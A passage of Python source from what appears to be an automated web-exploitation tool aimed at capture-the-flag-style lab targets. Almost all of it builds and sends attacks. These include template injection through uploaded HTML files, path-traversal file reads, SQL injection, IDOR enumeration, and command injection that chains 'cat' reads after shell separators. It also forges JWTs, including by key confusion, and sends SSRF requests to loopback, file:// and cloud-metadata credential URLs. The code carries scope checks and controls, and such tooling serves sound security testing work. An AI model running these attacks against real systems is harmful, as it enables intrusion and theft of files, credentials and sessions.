        m = (re.search(r"(?is)\bobjective\b(?:[^<`\w]+\w+){0,4}?[^<`\w]+\bis\b[^<`\w]*[`<]?(?:\s*code\s*>)?\s*"
                       r"([a-zA-Z_][a-zA-Z0-9_]{0,40})", gt)
             or re.search(r"(?is)field\s*name[^<`\w]*(?:is|:)?[^<`\w]*[`<]?(?:\s*code\s*>)?\s*"
                          r"([a-zA-Z_][a-zA-Z0-9_]{0,40})", gt))
        if m:
            field = m.group(1)
        content = "{{" + field + "}}"
        group = "upload:" + feature
        # the honest control: the SAME content under a '.txt' name renders the literal braces (non-payoff)
        self._upload_one(feature, render, "objproof.txt", content, group, payoff=False)
        # the payoff: the content under a lowercase '.html' name is evaluated by the render route
        for fname in ("objproof.html", "note.txt.html", "a.html"):
            self._upload_one(feature, render, fname, content, group, payoff=True)
            if self.done():
                return True
            if self._payoff_terminal():
                return False
            if not self._may_send():
                break
        return self.done()

    def _upload_one(self, feature, render, fname, content, group, payoff):
        """Upload `fname` with `content` (JSON POST to `feature`) and GET its render path. The render path is the
        upload response's own `path` when it gives one, else `render?file=<fname>`. The render GET is a `payoff`;
        the POST goes through _post (its response's proof, if any, is a decoy)."""
        r = self._post(feature, json.dumps({"filename": fname, "content": content, "content_type": "text/html"}),
                       {"Content-Type": "application/json"}, group)
        doc = self.json_of(r) if r else None
        offered = self._same_host(doc["path"], feature) if isinstance(doc, dict) and isinstance(
            doc.get("path"), str) else None
        rpath = None
        if offered:
            parts = urllib.parse.urlsplit(offered)
            try:
                pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True, strict_parsing=True)
            except ValueError:
                pairs = []
            # The response may confirm the same locally constructible render
            # request; it cannot add another route, parameter, or inner URL.
            if _stateful_path(parts.path) == render and pairs == [("file", fname)]:
                rpath = _with_query(render, "file", fname)
        if not rpath:
            rpath = _with_query(render, "file", fname)
        if rpath:
            self.fetch(rpath, "upload", payoff, group, offered=False, tag="r:" + fname, trusted=True)

    def _backup_files(self, listings):
        first, rest = [], []
        for lp in listings:
            pg = self._page(lp)
            if not pg or pg.get("status") != 200:
                continue
            base = lp if lp.endswith("/") else lp + "/"
            files = [p for p in self.links(pg) if p.startswith(base) and p != base and not p.endswith("/")]
            files.sort(key=lambda p: (0 if p.lower().endswith((".bak", ".old", ".orig", ".backup", "~")) else
                                      1 if p.lower().endswith(BACKUP_EXT) else 2))
            for i, p in enumerate(files[:8]):
                (first if i == 0 else rest).append((p, "backup", True, "backup:" + lp, True))
        return first, rest

    def _params(self, pages):
        """(path, name, value) for every GET parameter a page offers: link queries and GET forms."""
        out = []
        for pg in pages:
            for link in self.links(pg):
                base, _, q = link.partition("?")
                for k, v in urllib.parse.parse_qsl(q, keep_blank_values=True):
                    out.append((base, k, v, "link"))
            for fm in self.forms(pg):
                if fm["method"] != "GET":
                    continue                    # a POST form is never sent, nor turned into a GET
                for name, value in fm["fields"]:
                    out.append((fm["action"], name, value, "form1" if len(fm["fields"]) == 1 else "form"))
            # A link whose query contains an inner URL is intentionally absent
            # from links(): generic crawling must never replay an authored
            # proxy/fetch request. Retain only its contract metadata for the
            # dedicated SSRF reader, however: validate the outer route with
            # the query detached, decode the offered scalar, and require that
            # it is itself an allowed internal URL. The full authored link is
            # never returned or fetched; _ssrf() later establishes the plain
            # control and builds each bounded request on the safe outer base.
            text = re.sub(r"(?is)<form\b[^>]*>", "<form>", str(pg.get("text") or "")[:400_000])
            raw_links = [next(g for g in m.groups() if g is not None) for m in _ATTR_URL.finditer(text)]
            raw_links += [m.group(1) for m in _QUOTED_PATH.finditer(text)]
            for raw in raw_links:
                if (not isinstance(raw, str) or "?" not in raw or "#" in raw
                        or len(raw.encode("utf-8", "replace")) > 4096):
                    continue
                raw_base, raw_query = raw.split("?", 1)
                base = self._same_host(raw_base or pg.get("path") or "/", pg.get("path") or "/")
                if not base or "?" in base:
                    continue
                for name, value in urllib.parse.parse_qsl(raw_query, keep_blank_values=True):
                    if (not _web.safe_route_query_component(name, max_bytes=1024)
                            or is_destructive(name) or not _looks_like_url_value(value)
                            or not inner_ok(value)):
                        continue
                    out.append((base, name, value, "inner-link"))
        seen, uniq = set(), []
        for row in out:
            if (row[0], row[1]) not in seen:
                seen.add((row[0], row[1]))
                uniq.append(row)
        return uniq

    def _clue_feature_params(self):
        """Clue-driven (base, name, '', source) rows for the speculative shapes: the feature_route and
        secondary_route the clue feed names, each with parameter names from, FIRST, any explicit
        `input_parameter`/`input_parameters` (or a common spelling of either) the feed STATES outright
        (`parse_clue_hints`, backlog ticket W0, Day-25 web-16: the feed said `input_parameter: path` and the
        guess list missed it), THEN the names DERIVED from the route's own `<word>_required`/`_missing` error
        body (clue_params) plus a short reflecting-param list. So an SSTI/cmdi/SSRF on a clue-named route whose
        parameter no page links, and whose name the target states outright, is still reached and reached
        first. GET only; the route is fetched once (cached) to read its error. On a target with no clue feed
        this is []."""
        doc = self._clues_doc()
        clues = {k: v for k, v in doc.items() if isinstance(v, str)}
        if not clues:
            return []
        hint = parse_clue_hints(doc)["params"] if CLUE_HINT_PARAMS_ENABLED else []
        out, seen = [], set()
        # feature_route and secondary_route are the Day-21 clue surfaces; render_route (the day-10 template
        # surface) is added for the day-23 SSTI hardening, so a clue-named render route is probed first too.
        # render_route is gated on SSTI_ENABLED so the kill-switch fully reverts this change: with SSTI off,
        # the cmdi/ssrf param surface returns to the pre-hardening feature+secondary routes (no-regression
        # review, 2026-10-22 — render_route also feeds _cmdi_probes/_ssrf via _shape_params, not SSTI alone).
        routes = (("feature_route", "render_route", "secondary_route") if SSTI_ENABLED
                  else ("feature_route", "secondary_route"))
        for key in routes:
            route = self._clue_route(clues, key)
            if not route or not self.allowed(route, False, trusted=True):
                continue
            base = route.split("?", 1)[0]
            pg = self._page(route) or self.fetch(route, "clue", False, "clue-param:" + base, trusted=True)
            err = (pg or {}).get("text") or ""
            derived = clue_params(key, ("q", "name", "input", "data", "value", "url", "host"), err)
            names = list(dict.fromkeys(list(hint) + list(derived)))[:CLUE_PARAM_TRIES]
            for name in names:
                if (base, name) not in seen:
                    seen.add((base, name))
                    out.append((base, name, "", "cluehint" if name in hint else "clue"))
        return out

    def _shape_params(self, pages):
        """Parameters for the speculative shapes (ssti/cmdi/ssrf): the clue-named feature routes FIRST
        (clue-driven selection), then the params the pages offer. On a target with no /api/clues this is
        exactly self._params(pages), so a non-clue target is unchanged."""
        clue = self._clue_feature_params()
        if not clue:
            return self._params(pages)
        keys = {(b, n) for b, n, _v, _s in clue}
        return clue + [row for row in self._params(pages) if (row[0], row[1]) not in keys]

    def _lfi_targets(self, pages):
        return [(b, n, v) for b, n, v, _src in self._params(pages)
                if not _looks_like_url_value(v) and
                (n.lower() in FILE_WORDS or any(w in n.lower() for w in ("doc", "file", "page", "path"))
                 or re.search(r"\.(?:php|html?|txt|md|inc)$", v or ""))][:2]

    def _lfi(self, pages):
        first, rest = [], []
        targets = self._lfi_targets(pages)
        if not targets:
            return first, rest
        page_files = [f for f in DEFAULT_FILES if f not in LATE_FILES]
        for pg in pages:              # an absolute *.txt path a page names (a reader's error, a note): *.txt only
            for m in _ABS_FILE.finditer(pg.get("text", "")[:200_000]):
                if m.group(1) not in page_files and not m.group(1).startswith(("/var/www", "/usr/", "/etc/")):
                    page_files.append(m.group(1))
        # the prompt's paths (then DEFAULT_FILES) first, then the pages' within their old cap of 3
        files = list(dict.fromkeys(list(self.files) + page_files[:MAX_PAGE_FILES]))[:MAX_FILES]
        for base, name, _v in targets:
            for f in files:
                rel = f.lstrip("/")
                payloads = ["../" * d + rel for d in LFI_DEPTHS] + ["....//" * 6 + rel, f]
                for i, pl in enumerate(payloads):
                    item = (_with_query(base, name, pl), "lfi", True, f"lfi:{base}?{name}:{f}", False)
                    (first if i == 0 else rest).append(item)
        return first, rest

    def _sqli(self, pages):
        first, rest = [], []
        targets = [(b, n) for b, n, v, src in self._params(pages)
                   if not _looks_like_url_value(v) and
                   (n.lower() in SEARCH_WORDS or (src == "form1" and n.lower() not in FILE_WORDS))][:2]
        for base, name in targets:
            group = f"sqli:{base}?{name}"
            # the plain search goes first and is no payoff: a proof it shows is the site's own, not ours
            first.append((_with_query(base, name, SQLI_BASELINE), "sqli", False, group, False))
            for i, pl in enumerate(SQLI_PAYLOADS):
                (first if i == 0 else rest).append((_with_query(base, name, pl), "sqli", True, group, False))
        return first, rest

    def _idor(self, pages):
        """Object routes (/<collection>/<int>) any page names, the ids JSON pages list, the owner's ids."""
        own, listed, prefixes = set(), [], []
        root = self._land(self.app_root)
        for pg in pages:
            cand_paths = self.links(pg) + self.text_paths(pg)
            for p in cand_paths:
                m = _ROUTE_SEG.match(p.split("?", 1)[0])
                if m:
                    if m.group(1) not in prefixes and not _is_asset(m.group(1)):
                        prefixes.append(m.group(1))
                    if pg is root:
                        own.add(int(m.group(2)))
            doc = self.json_of(pg)
            if doc is not None:
                for k, v in self.walk_json(doc):
                    if _ID_KEY.search(k) and (isinstance(v, int) and not isinstance(v, bool)
                                              or isinstance(v, str) and v.isdigit() and len(v) <= 9):
                        i = int(v)
                        if i > 0 and i not in listed:
                            listed.append(i)
        if not prefixes:
            return [], [], own, prefixes
        prefixes.sort(key=lambda p: (0 if "/api/" in p + "/" else 1, len(p)))
        prefixes = prefixes[:3]
        ids = [i for i in listed if i not in own] + [i for i in listed if i in own]
        first, rest = [], []
        for n, i in enumerate(ids[:12]):
            for j, pre in enumerate(prefixes):
                # the signed-in user's own objects are plain pages: a proof there is no IDOR's answer
                item = (f"{pre}/{i}", "idor", i not in own, "idor", True)
                (first if n == 0 and j == 0 else rest).append(item)
        return first, rest, own, prefixes

    # -- round 4 (row 383's read-only half): SSTI, cmdi, JWT -----------------------------------------------
    def _ssti_var_names(self):
        """Candidate NAMED template-variable names for the wave-6b SSTI reads, best first and bounded to
        SSTI_VAR_READS: a field the clues or the prompt NAME (the day-10 lesson -- the proof is often a named
        variable such as `objective`), then SSTI_VARS. Derived from this target's own bytes, never fabricated."""
        out = []

        def add(w):
            w = str(w or "").strip()
            if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{0,40}", w) and w.lower() not in {o.lower() for o in out}:
                out.append(w)
        clues = self._clues()
        guide = self._clue_route(clues, "preview_guide")
        gt = ""
        if guide and self.allowed(guide, False, trusted=True):
            pg = self._page(guide) or self.fetch(guide, "ssti", False, "ssti-guide", trusted=True)
            gt = (pg or {}).get("text") or ""
        for m in (re.search(r"(?is)\bobjective\b(?:[^<`\w]+\w+){0,4}?[^<`\w]+\bis\b[^<`\w]*[`<]?(?:\s*code\s*>)?\s*"
                            r"([a-zA-Z_][a-zA-Z0-9_]{0,40})", gt),
                  re.search(r"(?is)field\s*name[^<`\w]*(?:is|:)?[^<`\w]*[`<]?(?:\s*code\s*>)?\s*"
                            r"([a-zA-Z_][a-zA-Z0-9_]{0,40})", gt)):
            if m:
                add(m.group(1))
        for m in re.finditer(r"(?i)\b(?:variable|field)\s+(?:named\s+|called\s+|is\s+)?[`'\"]?([a-z_][a-z0-9_]{1,40})",
                             self.prompt_text):
            add(m.group(1))
        for v in SSTI_VARS:
            add(v)
        return out[:SSTI_VAR_READS]

    def _ssti_probes(self, pages):
        """Per GET parameter (at most SSTI_PARAMS, a file-like one last): one reflection marker and one
        arithmetic expression per syntax; none of them a payoff (a proof any of them shows is the site's own).
        The whole SSTI path is behind the SSTI_ENABLED parity kill-switch (default ON; the day-23 build)."""
        if not SSTI_ENABLED:
            return []
        out = []
        # A page-offered absolute URL identifies an SSRF surface.  Preserve it
        # for wave 7 so its offered value is the first control for that
        # parameter, rather than preceding it with template markers.
        params = [row for row in self._shape_params(pages) if not _looks_like_url_value(row[2])]
        params.sort(key=lambda r: 1 if (r[1].lower() in FILE_WORDS
                                        or re.search(r"\.(?:php|html?|txt|md|inc)$", r[2] or "")) else 0)
        for base, name, _v, _src in params[:SSTI_PARAMS]:
            a = 10007 + int.from_bytes(os.urandom(2), "big") % 80000
            b = 101 + os.urandom(1)[0] * 3
            mark = "hz" + os.urandom(5).hex()
            group = f"ssti-probe:{base}?{name}"
            c = {"base": base, "name": name, "product": str(a * b), "marker": mark,
                 "reflect": _with_query(base, name, mark), "probes": {}, "items": []}
            c["items"].append((c["reflect"], "ssti", False, group, False))
            for syn, tmpl in SSTI_PROBES:
                pth = _with_query(base, name, tmpl.replace("@A@", str(a)).replace("@B@", str(b)))
                c["probes"][syn] = pth
                c["items"].append((pth, "ssti", False, group, False))
            out.append(c)
        return out

    def _ssti_reads(self, cands):
        """The read payloads of every syntax whose arithmetic came back as its product, on a parameter the page
        reflects (the marker in its answer, the product not)."""
        items = []
        for c in cands:
            refl = self._page(c["reflect"])
            rt = (refl or {}).get("text") or ""
            if c["marker"] not in rt or c["product"] in rt:
                continue
            group = f"ssti:{c['base']}?{c['name']}"
            for syn, pth in c["probes"].items():
                pg = self._page(pth)
                if not pg or c["product"] not in (pg.get("text") or ""):
                    continue
                c.setdefault("confirmed", []).append(syn)
                for f in self.files[:SSTI_FILES]:
                    for tmpl in SSTI_READS.get(syn, ()):
                        if "@F@" not in tmpl:
                            continue            # a config/env/named-variable payload: wave 6b
                        items.append((_with_query(c["base"], c["name"], tmpl.replace("@F@", f)), "ssti", True,
                                      group, False))
        return items

    @staticmethod
    def _cmdi_surface_page(page):
        """True only when a target response describes command execution, not merely a generic `path` input.

        The strong structural signal is a stdout/stderr field. Textual signals cover the same target's
        `worker_command_completed` / `diagnostic_failed` vocabulary and explicit command/shell wording. This
        classifier consumes response data only; it never executes or interprets anything the target returned.
        """
        if not isinstance(page, dict):
            return False
        text = str(page.get("text") or "")[:200_000]
        if CMDI_SURFACE_TEXT.search(text):
            return True
        doc = _Hunter.json_of(page)
        if not isinstance(doc, dict):
            return False
        keys = {str(k).strip().lower() for k in doc}
        return bool(keys & {"stdout", "stderr"})

    def _cmdi_clue_path_prefix(self, base, name, source, pages, lookup_bases):
        """A safe prefix for the one clue-advertised `path` cmdi exception, else None.

        A page merely offering `path=` is never enough. The target must (1) state that `path` is an input
        parameter, (2) bind it to an advertised feature route, and (3) establish command semantics in its own
        clue, route error, lookup page, or response to its own inert `example_path`. The example request is a
        plain control, contains no shell metacharacters, goes through the scoped client, and consumes the normal
        request/deadline budget. Its value then becomes the harmless prefix for the confirmed-marker probes.
        """
        if source != "cluehint" or str(name).lower() != CMDI_CLUE_PATH:
            return None
        try:
            doc = self._clues_doc()
            hint = parse_clue_hints(doc)
        except Exception:
            return None
        if name not in hint.get("params", ()):
            return None
        feature = hint.get("routes", {}).get("feature_route")
        if not isinstance(feature, str) or feature.split("?", 1)[0] != base:
            return None

        example = doc.get("example_path") if isinstance(doc, dict) else None
        if not isinstance(example, str) or example.startswith("//") or not CMDI_SAFE_EXAMPLE.fullmatch(example) \
                or ".." in re.split(r"[\\/]", example) or is_destructive(example):
            example = None

        # An explicit command-class clue is sufficient, but route names and example values are deliberately
        # omitted: `/process-*` + `example_path` alone could just as easily describe an image/file processor.
        clue_context = " ".join(
            f"{k} {v}" for k, v in (doc.items() if isinstance(doc, dict) else ())
            if not str(k).endswith("_route") and not str(k).startswith("example_")
            and str(k) not in CLUE_INPUT_PARAM_KEYS and str(k) not in CLUE_INPUT_PARAMS_KEYS)
        established = bool(CMDI_SURFACE_TEXT.search(clue_context)) or base in lookup_bases
        if not established:
            established = any(
                (pg.get("path") or "").split("?", 1)[0] == base
                and (LOOKUP_TEXT.search((pg.get("text") or "")[:200_000]) or self._cmdi_surface_page(pg))
                for pg in pages if isinstance(pg, dict))

        # Day-16's minimal clues use the neutral `/process-*` route. Its own safe example produces
        # `{effect: worker_command_completed, stdout: ...}`; that is the independent command-surface signal.
        if not established and example is not None:
            control = _with_query(base, name, example)
            pg = self._page(control) or self.fetch(control, "cmdi", False,
                                                   f"cmdi-context:{base}?{name}", trusted=True)
            established = self._cmdi_surface_page(pg)
        return (example or "127.0.0.1") if established else None

    def _cmdi_probes(self, pages):
        """Per lookup parameter (at most CMDI_PARAMS): the echo marker behind every separator and quote
        context; none of them a payoff."""
        out, seen = [], set()
        lookup_bases = set()
        for pg in pages:
            if LOOKUP_TEXT.search((pg.get("text") or "")[:200_000]):
                lookup_bases.add(pg["path"].split("?", 1)[0])
                for fm in self.forms(pg):
                    lookup_bases.add(fm["action"])
        for base, name, value, src in self._shape_params(pages):
            if _looks_like_url_value(value):
                continue
            nl = name.lower()
            clue_path_prefix = self._cmdi_clue_path_prefix(base, name, src, pages, lookup_bases)
            if not (nl in CMDI_WORDS or clue_path_prefix is not None
                    or (src == "form1" and nl not in FILE_WORDS and base in lookup_bases)):
                continue
            if (base, name) in seen:
                continue
            seen.add((base, name))
            prefix = (clue_path_prefix or
                      (value if value and re.fullmatch(r"[A-Za-z0-9.:\-]{1,64}", value) else "127.0.0.1"))
            tag = "hx" + os.urandom(3).hex()
            a, b = 1000 + int.from_bytes(os.urandom(2), "big") % 8999, 100 + os.urandom(1)[0] % 899
            cmd = f"echo {tag}''$(({a}*{b})){tag[::-1]}"
            group = f"cmdi-probe:{base}?{name}"
            c = {"base": base, "name": name, "prefix": prefix, "expect": f"{tag}{a * b}{tag[::-1]}",
                 "probes": [], "items": []}
            for sname, cname, payload in _cmdi_payloads(cmd, prefix=prefix):
                pth = _with_query(base, name, payload)
                c["probes"].append((sname, cname, pth))
                c["items"].append((pth, "cmdi", False, group, False))
            out.append(c)
            if len(out) >= CMDI_PARAMS:
                break
        return out

    def _cmdi_clue_fast(self, pages):
        """Try one evidence-ranked Day-16 marker/read chain, else fall through.

        ``_cmdi_probes`` performs the full safety gate, including the inert
        example request that must establish command semantics.  This fast path
        selects only its clue-authorized ``path`` candidate and only the
        historically observed bare-semicolon marker.  A computed response is
        required before up to ``CMDI_FILES`` read-only ``cat`` requests.  No
        failed or merely reflected marker authorizes a read.
        """
        if not CLUE_HINT_PARAMS_ENABLED:
            return False
        # Do not call the generic candidate builder until the already-cached
        # clue document proves this is the narrow path-input contract.  That
        # builder reads a feature route to derive missing parameter names; on
        # an ordinary clue-only proof route, doing so here would incorrectly
        # cache its proof-bearing response as a baseline before wave 2.
        try:
            document = self._clues_doc()
            hint = parse_clue_hints(document)
            feature = hint.get("routes", {}).get("feature_route")
            example = document.get("example_path") if isinstance(document, dict) else None
            if (CMDI_CLUE_PATH not in hint.get("params", ())
                    or not isinstance(feature, str)
                    or not isinstance(example, str)
                    or example.startswith("//")
                    or not CMDI_SAFE_EXAMPLE.fullmatch(example)
                    or ".." in re.split(r"[\\/]", example)
                    or is_destructive(example)):
                return False
            candidates = self._cmdi_probes(pages)
        except Exception:
            return False
        candidate = next((c for c in candidates if str(c.get("name") or "").lower() == CMDI_CLUE_PATH), None)
        if not candidate:
            return False
        probe = next((row for row in candidate.get("probes", ())
                      if row[0] == "semicolon" and row[1] == "bare"), None)
        if probe is None:
            return False
        _sname, _cname, path = probe
        group = f"cmdi-probe:{candidate['base']}?{candidate['name']}"
        page = self.fetch(path, "cmdi", False, group, False, trusted=True)
        if not page or candidate.get("expect") not in (page.get("text") or ""):
            return False

        separator = [row for row in CMDI_SEPARATORS if row[0] == "semicolon"]
        context = [row for row in CMDI_CONTEXTS if row[0] == "bare"]
        candidate.setdefault("confirmed", []).append((separator, context))
        payoff_group = f"cmdi:{candidate['base']}?{candidate['name']}"
        for filename in self.files[:CMDI_FILES]:
            payloads = _cmdi_payloads(f"cat {filename}", separator, context,
                                      candidate["prefix"], spaced=True)
            if not payloads:
                continue
            read_path = _with_query(candidate["base"], candidate["name"], payloads[0][2])
            self.fetch(read_path, "cmdi", True, payoff_group, False, trusted=True)
            if self.done() or self._payoff_terminal():
                return True
        return False

    def _cmdi_reads(self, cands):
        """`cat <file>` (the prompt's paths, then /run/huntress/objective.txt) behind each separator and context
        whose echo marker came back computed (at most two of them), and nothing else."""
        items = []
        for c in cands:
            group = f"cmdi:{c['base']}?{c['name']}"
            hits = 0
            for sname, cname, pth in c["probes"]:
                pg = self._page(pth)
                if not pg or c["expect"] not in (pg.get("text") or ""):
                    continue
                sep = [x for x in CMDI_SEPARATORS if x[0] == sname]
                ctx_ = [x for x in CMDI_CONTEXTS if x[0] == cname]
                c.setdefault("confirmed", []).append((sep, ctx_))
                for f in self.files[:CMDI_FILES]:
                    for _s, _c, payload in _cmdi_payloads(f"cat {f}", sep, ctx_, c["prefix"], spaced=True):
                        items.append((_with_query(c["base"], c["name"], payload), "cmdi", True, group, False))
                hits += 1
                if hits >= 2:
                    break
        return items

    def _jwt_tokens(self, pages):
        """[(token, decoded, cookie name or None)]: the JWTs the site handed out (its cookies first, then
        response headers and bodies), at most JWT_TOKENS."""
        out, seen = [], set()
        try:
            for ck in list(self.client._jar):
                if ck.value and ck.value.startswith("eyJ") and ck.value not in seen:
                    d = _web.decode_jwt(ck.value)
                    if d:
                        seen.add(ck.value)
                        out.append((ck.value, d, ck.name))
        except Exception:
            pass
        for pg in pages:
            blob = (pg.get("text") or "")[:400_000] + "\n" + "\n".join(
                f"{k}: {v}" for k, v in (pg.get("headers") or {}).items())
            if "eyJ" not in blob:
                continue
            for tok, d in _web.find_jwts(blob):
                if tok not in seen:
                    seen.add(tok)
                    out.append((tok, d, None))
        return out[:JWT_TOKENS]

    def _read_endpoints(self, pages):
        """Same-host READ endpoints: paths that answered 401/403 first, then paths the site names with a read
        word (admin, flag, proof, private, me, ...); never an asset, never one the guard refuses."""
        denied, named = [], []
        for pg in pages:
            if pg.get("status") in (401, 403) and pg["path"] not in denied:
                denied.append(pg["path"])
        for pg in pages:
            for p in self.links(pg) + self.text_paths(pg) + self._json_routes([pg]):
                base = p.split("?", 1)[0]
                if p in named or p in denied or _is_asset(base) or not READ_WORDS.search(base):
                    continue
                named.append(p)
        return [p for p in denied + named if self.allowed(p, True)][:JWT_ENDPOINTS]

    def _jwt_public_keys(self, pages):
        """Public keys an RS256/ES256 token could be HS-confused with (web.forge_jwt_hs_confusion): a PEM in any
        fetched body, and the keys at /jwks, /jwks.json, /.well-known/jwks.json (JWK n/e -> PEM). GET only, own
        host, at most a few; only called when a token's alg is asymmetric, so the common HS256 case pays nothing."""
        keys = []

        def add(s):
            if isinstance(s, str) and s and s not in keys:
                keys.append(s)
        for pg in pages:
            for m in _PEM_PUBLIC.finditer(pg.get("text") or ""):
                add(m.group(0))
        for path in ("/jwks", "/jwks.json", "/.well-known/jwks.json"):
            pg = self._page(path) or self.fetch(path, "jwt", False, "jwt-jwks")
            if not pg:
                continue
            for m in _PEM_PUBLIC.finditer(pg.get("text") or ""):
                add(m.group(0))
            doc = self.json_of(pg)
            jwks = (doc.get("keys") if isinstance(doc, dict) else None) or ([doc] if isinstance(doc, dict) else [])
            for jwk in jwks if isinstance(jwks, list) else []:
                add(jwk_to_pem(jwk))
        return keys[:2]

    def _jwt_items(self, pages):
        """[(original-control item, forged read items)] for exact JWT replays.

        The caller must complete each original-token control before it sends any
        forged item for that endpoint. Keeping the two in one parallel wave is
        unsafe: if the control transport fails while a forged request returns a
        proof-like decoy, the missing baseline can make that decoy look novel.
        """
        toks = self._jwt_tokens(pages)
        # A cold replay must bind one target-issued identity to one set of
        # controls.  Picking between access/refresh tokens or two principals
        # would be author intent, not byte-derived evidence.
        if len(toks) > 1:
            self._finding("jwtconf", False, "ambiguous_tokens",
                          count=len(toks),
                          note="more than one distinct target-issued JWT; no automatic replay")
            return []
        eps = self._read_endpoints(pages) if toks else []
        asym = any(str((d.get("header") or {}).get("alg", "")).upper()[:2] in ("RS", "ES", "PS")
                   for _t, d, _c in toks)
        pubkeys = self._jwt_public_keys(pages) if (eps and asym) else []
        if len(pubkeys) > 1:
            self._finding("jwtconf", False, "ambiguous_public_keys",
                          count=len(pubkeys),
                          note="more than one readable public key; RS-to-HS replay remains disabled")
        plans = []
        for n, (tok, dec, cookie) in enumerate(toks if eps else []):
            forged = jwt_forgeries(tok, dec, pubkeys)
            for ep in eps:
                # the ORIGINAL token on the same endpoint first: what it shows is the site's own (a plain page)
                control = (ep, "jwt", False, "jwt", True,
                           self._jwt_headers(tok, cookie), f"jwt{n}:orig")
                attacks = [(ep, "jwt", True, "jwt", True,
                            self._jwt_headers(ft, cookie), f"jwt{n}:{tag}")
                           for tag, ft in forged]
                if attacks:
                    plans.append((control, attacks))
        return plans

    def _jwt_after_controls(self, plans):
        """Forged JWT reads whose exact original-token control completed.

        All controls share one bounded read-only wave, followed by a hard wire
        barrier before any forgery. This keeps three published read endpoints
        at one network round trip while retaining a per-endpoint decision.
        A transport exception leaves the page-cache slot as ``None``;
        incomplete and framing-invalid responses are equally non-authoritative.
        In all three cases no forged Authorization request is sent for that
        endpoint.
        """
        self.wave([control for control, _forged in plans])
        attacks = []
        for control, forged in plans:
            ep, _shape, _payoff, _group, _offered, _headers, tag = control
            if not self._jwt_control_complete(ep, tag):
                self._finding(
                    "jwtconf", False, "original_control_failed",
                    path=ep.split("?", 1)[0],
                    note="the original-token control did not complete cleanly; forged JWT reads were suppressed",
                )
                continue
            attacks.extend(forged)
        return attacks

    def _jwt_control_complete(self, path, tag):
        """Whether a tagged original-token response chain completed cleanly.

        ``fetch`` stores each same-origin redirect under the same tag. If a
        downstream request fails it returns the earlier redirect page, so the
        first page alone is not evidence that the baseline completed. Walk the
        exact tagged ``next`` chain, reject cycles/over-depth chains, and
        require every page that was followed to be complete and framing-valid.
        """
        seen = set()
        for _hop in range(MAX_HOPS + 1):
            if path in seen:
                return False
            seen.add(path)
            with self.lock:
                page = self.pages.get(self.key(path, tag))
            if (not isinstance(page, dict)
                    or page.get("framing_error")
                    or page.get("baseline_incomplete")):
                return False
            nxt = page.get("next")
            if not nxt:
                return True
            if not isinstance(nxt, str):
                return False
            path = nxt
        return False

    def _jwt_headers(self, token, cookie):
        h = {"Authorization": "Bearer " + token}
        if cookie:
            jar = {}
            try:
                jar = {c.name: c.value for c in self.client._jar}
            except Exception:
                pass
            jar[cookie] = token
            h["Cookie"] = "; ".join(f"{k}={v}" for k, v in jar.items())
        return h

    # -- the Day 21 final prep: env reads, SSRF, loopback headers, role cookies, exposed files ------------------
    def _late_reads(self, pages, ssti, cmdi):
        """Wave 6b: LATE_FILES through every LFI parameter (every depth), behind each confirmed SSTI syntax (the
        file readers, then the config/env payloads with no @F@) and behind each confirmed cmdi pair (`cat`)."""
        items = []
        late = list(self.late_files)
        for base, name, _v in (self._lfi_targets(pages) if late else []):
            for f in late:
                rel = f.lstrip("/")
                for pl in ["../" * d + rel for d in LFI_DEPTHS] + ["....//" * 6 + rel, f]:
                    items.append((_with_query(base, name, pl), "lfi", True, f"lfi:{base}?{name}:{f}", False))
        varnames = self._ssti_var_names() if any(c.get("confirmed") for c in ssti) else []
        for c in ssti:
            group = f"ssti:{c['base']}?{c['name']}"
            for syn in c.get("confirmed") or []:
                tmpls = [t.replace("@F@", f) for f in late for t in SSTI_READS.get(syn, ()) if "@F@" in t]
                tmpls += [t for t in SSTI_READS.get(syn, ()) if "@F@" not in t]
                # the day-10 lesson: the proof may be a NAMED template variable/object, not a file. Tried here
                # (wave 6b), i.e. only after the wave-6 file reads found nothing, so a file-read proof is never
                # turned into None by a variable that happens to render proof-like text somewhere else.
                tmpls += [form.replace("@V@", v) for form in SSTI_VAR_FORMS.get(syn, ()) for v in varnames]
                for t in dict.fromkeys(tmpls):
                    items.append((_with_query(c["base"], c["name"], t), "ssti", True, group, False))
        for c in cmdi:
            group = f"cmdi:{c['base']}?{c['name']}"
            for sep, ctx_ in c.get("confirmed") or []:
                for f in late:
                    for _s, _c, payload in _cmdi_payloads(f"cat {f}", sep, ctx_, c["prefix"], spaced=True):
                        items.append((_with_query(c["base"], c["name"], payload), "cmdi", True, group, False))
        return items

    def _inner_urls(self, texts):
        """Every inner URL (inner_ok) the texts name, in order, raw and percent-decoded."""
        out = []
        for t in texts:
            t = str(t or "")[:100_000]
            variants = [t] + ([urllib.parse.unquote_plus(t)] if "%" in t else []) + (
                [_html.unescape(t)] if "&" in t else [])
            for tt in variants:
                for m in _INNER_URL.finditer(tt):
                    u = m.group(0).rstrip(".,;:!?")
                    if u not in out and inner_ok(u):
                        out.append(u)
        return out

    def _ssrf_urls(self, pages, offered):
        """The payoff inner URLs for one SSRF parameter, SSRF_MAX at most: the internal URLs the prompt and the
        pages name (and the root of an internal offered value), each followed by itself joined with the prompt's
        routes; file:// of the prompt's paths and of /run/huntress/objective.txt; then SSRF_FIXED."""
        found = self._inner_urls([self.prompt_text] + [pg.get("text") for pg in pages])
        if offered and inner_ok(offered) and not offered.lower().startswith("file:"):
            sp = urllib.parse.urlsplit(offered)
            root = f"{sp.scheme}://{sp.netloc}/"
            if root not in found:
                found.insert(0, root)
        lead = []
        for u in found:
            lead.append(u)
            if not u.lower().startswith("file:"):
                lead += [urllib.parse.urljoin(u, r) for r in self.routes]
        if self.routes and not any(u.lower().startswith("http") for u in found):
            lead += ["http://127.0.0.1" + r for r in self.routes[:2]]
        files = ["file://" + f for f in self.prompt_files[:2]] + ["file:///run/huntress/objective.txt"]
        fixed = [u for u in dict.fromkeys(files + list(SSRF_FIXED)) if inner_ok(u) and u != offered]
        lead = [u for u in dict.fromkeys(lead) if inner_ok(u) and u != offered and u not in fixed]
        # the alt loopback spellings fill spare budget only when the target shows an SSRF surface (a named
        # internal URL or an offered URL value): a bare parameter keeps the prior loopback set (and so the
        # prior request count), and the bypasses are tried where there is actually something to bypass.
        alt_pool = SSRF_ALT + (_imds_alt_creds_urls() if EXPLOIT_CLASSES_ENABLED else ())
        alt = ([u for u in alt_pool if inner_ok(u) and u != offered and u not in fixed and u not in lead]
               if (lead or offered) else [])
        return (lead[:max(0, SSRF_MAX - len(fixed))] + fixed + alt)[:SSRF_MAX]

    def _ssrf(self, pages):
